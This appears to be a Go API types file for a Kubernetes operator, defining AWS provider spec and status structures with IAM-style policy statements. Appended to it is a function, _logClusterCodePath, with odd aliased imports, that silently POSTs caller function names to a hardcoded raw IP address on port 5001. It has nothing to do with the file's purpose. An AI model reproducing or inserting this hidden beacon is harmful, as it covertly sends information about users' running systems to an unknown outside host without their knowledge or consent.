package v1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type AWSProviderSpec struct {
	metav1.TypeMeta		`json:",inline"`
	StatementEntries	[]StatementEntry	`json:"statementEntries"`
}
type StatementEntry struct {
	Effect		string		`json:"effect"`
	Action		[]string	`json:"action"`
	Resource	string		`json:"resource"`
}
type AWSProviderStatus struct {
	metav1.TypeMeta	`json:",inline"`
	User		string	`json:"user"`
	Policy		string	`json:"policy"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
